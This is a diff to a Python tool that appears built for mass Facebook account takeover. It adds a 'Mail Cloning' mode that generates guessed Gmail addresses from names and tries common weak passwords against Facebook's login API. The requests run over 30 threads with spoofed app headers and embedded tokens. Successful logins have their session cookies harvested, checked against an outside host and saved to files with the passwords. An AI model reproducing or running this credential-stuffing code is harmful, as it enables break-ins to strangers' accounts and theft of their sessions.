@@ -181,7 +181,7 @@ def linex():
 
 def Main_Menu():
 		clear()
-		print(f'\033[1;37m [1] File Cloning \n [2] Random Cloning \n [3] Join WhatsApp Group \n [0] Exit')
+		print(f'\033[1;37m [1] File Cloning \n [2] Random Cloning \n [3] Mail Cloning \n [4] Join WhatsApp Group \n [0] Exit')
 		linex()
 		Awais= input('\033[1;37m [+] Select option: ')
 		if Awais =='1':
@@ -192,6 +192,8 @@ def Main_Menu():
 		elif Awais =='0':
 			exit(' Thanks For Using our tool ')
 		elif Awais =='3':
+			gmail()
+		elif Awais =='4':
 			os.system('xdg-open https://chat.whatsapp.com/JEiUAtoOroCEyQJAMXHRZe')
 		else:
 			print('\033[1;37m [+] Select valid option\033[1;37m ')
@@ -265,6 +267,157 @@ def r_crack():
 	else:
 		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);Main_Awais()
 
+
+def gmail():
+    os.system('rm -rf .re.txt')
+    clear()
+    print('\033[1;37m Example: \033[1;32m Awais, Ali, Ahmed, Hamza\033[1;97m')
+    linex()
+    first = input(' Put the first name: ')
+    linex()
+    print('\033[1;37m Example: \033[1;32m Rajpoot, Baloch, Khan \033[1;97m')
+    linex()
+    last = input(' Put the last name: ')
+    domain = "@gmail.com"
+    linex()
+    print(' Example: \033[1;32m 3000, 5000, 10000 \033[1;37m')
+    try:
+        limit = int(input(' [Amount] Put limit: '))
+    except ValueError:
+        limit = 5000
+    linex()
+    sim_id = ''
+    try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+            total += 1
+            print(f' [{total}] {i}')
+        select = input(' Put sim network: ')
+        if select == '1':
+            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
+            sim_id += fbcr
+        elif select == '2':
+            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '')
+            sim_id += fbcr
+    except:
+        fbcr = "ZONG"
+    clear()
+    print(' Getting gmails...')
+    lists = ['3', '4']
+    for xd in range(limit):
+        lchoice = random.choice(lists)
+        if '3' in lchoice:
+            mail = ''.join(random.choice(string.digits) for _ in range(3))
+            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
+        else:
+            mail = ''.join(random.choice(string.digits) for _ in range(4))
+            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
+        fo = open('.re.txt', 'r').read().splitlines()
+    with tred(max_workers=30) as Khan:
+        total = str(len(fo))
+        clear()
+        print(' Total account : \033[1;32m' + total)
+        print("\033[1;37m \033[1;33mUse flight mode more than more for best results \033[1;37m")
+        linex()
+        for user in fo:
+            ids, names = user.split('|')
+            first_name = names.rsplit(' ')[0]
+            try:
+                last_name = names.rsplit(' ')[1]
+            except IndexError:
+                last_name = 'Khan'
+            fs = first_name.lower()
+            ls = last_name.lower()
+            passlist = [fs + ls, fs + ' ' + ls, first_name + last_name, first_name + ' ' + last_name, fs + '123',
+                        fs + '786', fs + '12345', fs + '1122']
+            Khan.submit(rd, ids, passlist, fbcr)
+    print('\033[1;37m')
+    linex()
+    print(' The process has completed')
+    print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
+    linex()
+    input('\033[1;32m Press enter to go back \033[1;37m')
+
+def rd(ids, passlist, fbcr):
+    try:
+        global ok, loop, sim_id
+        sys.stdout.write('\r\r\033[1;37m [Mail-Cloning] %s|\033[1;32mOK:%s \033[1;37m' % (loop, len(oks)))
+        sys.stdout.flush()
+        for pas in passlist:
+            tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                         '256002347743983|374e60f8b9bb6b8cbb30f78030438895']
+            accessToken = random.choice(tokenlist)
+            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
+            fbbv = str(random.randint(111111111, 999999999))
+            fblc = "zh_HK"
+            fbfw = '1'
+            fbrv = '0'
+            if '350685531728' in accessToken:
+                fban = 'FB4A'
+                fbpn = 'com.facebook.katana'
+            else:
+                fban = 'Orca-Android'
+                fbpn = 'com.facebook.orca'
+            ua = 'Davik/2.1.0 (Linux; U; Android ' + fbsv + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBPN/' + fbpn + ';FBLC/' + fblc + ';FBBV/' + fbbv + ';FBCR/' + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBDV/' + model + ';FBSV/' + fbsv + '.0.1;FBCA/' + fbca + ';FBDM/{density=' + str(
+                random.randint(1, 9)) + '.' + str(random.randint(1, 9)) + ',width=' + str(
+                random.randint(500, 999)) + ',height=' + str(random.randint(999, 1999)) + '};FB_FW/1;]'.replace(
+                '\n', '')
+            head = {"User-Agent": ua, "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive",
+                    "Content-Type": "application/x-www-form-urlencoded", "Host": "graph.facebook.com",
+                    "X-FB-Net-HNI": str(random.randint(3e7, 4e7)), "X-FB-SIM-HNI": str(random.randint(2e4, 4e4)),
+                    "X-FB-Connection-Type": "MOBILE.LTE", "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
+                    "X-FB-Connection-Quality": "MOBILE.LTE",
+                    "X-FB-Connection-Bandwidth": str(random.randint(3e7, 4e7)), "X-Tigon-Is-Retry": "False",
+                    "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice",
+                    "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True",
+                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled", "source": "register_api", "email": ids,
+                    "password": pas, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1", "meta_inf_fbmeta": "NO_FILE",
+                    "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": "zh_HK",
+                    "client_country_code": "HK", "method": "auth.login", "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=head).json()
+            if 'session_key' in po:
+                uid = str(po['uid'])
+                ckkk = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
+                cookie = f"sb={ssbb};{ckkk}"
+                get_req = str(
+                    requests.get(f"https://livedeadsegs.pythonanywhere.com/segs_uid?uid={uid}").text)
+                if 'LIVE' in get_req:
+                    print('\r\r\033[1;32m [Awais-OK] ' + uid + ' | ' + pas)
+                    print(' \33[1;33m[Cookies🍪] : ' + cookie)
+                    open('/sdcard/Awais/Awais-Mail-OK.txt', 'a').write(uid + '|' + pas + '\n')
+                    open('/sdcard/Awais/Awais-Mail-OK-COOKIE.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
+                    oks.append(uid)
+                    break
+                if 'DEAD' in get_req:
+                    # print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
+                    file_path = os.path.join(folder_path, 'LOCK-IDS.txt')
+                    break
+            elif 'www.facebook.com' in po['error']['message']:
+                uid = str(po['error']['error_data']['uid'])
+                print('\r\033[1;91m [Awais-CP] ' + uid + ' | ' + pas + '\033[1;97m')
+                file_path = os.path.join(folder_path, 'Awais-CP.txt')
+                with open(file_path, 'a') as file:
+                    file.write(uid + '|' + pas + '\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop += 1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+        
+
+
 def rd1(ids,passlist):
 	try:
 		global ok,loop,sim_id
@@ -321,7 +474,7 @@ def rd2(ids,passlist):
 				access_token = random.choice(tokenlist)
 				fbcr = sim_id
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,999)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/406.0.0.15.266;FBBV/6422987;FBDM/{density=2.9,width=720,height=1280;FBLC/en_GB;FBRV/216672017;FBCR/"+fbcr+";FBMF/KYOCERA;FBBD/KYOCERA;FBPN/com.facebook.katana;FBDV/S8-KC;FBSV/11;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/457.0.0.42.601;FBBV/3231254;FBDM/{density=2.8,width=1080,height=2400;FBLC/en_GB;FBRV/298004071;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A716x;FBSV/10;FBCA/armeabi-v7a:armeabi;]"
+				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,999)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/457.0.0.42.601;FBBV/3231254;FBDM/{density=2.8,width=1080,height=1920;FBLC/en_GB;FBRV/262934071;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M127F;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
 				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
 				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_PK','client_country_code':'PK','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
 				po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
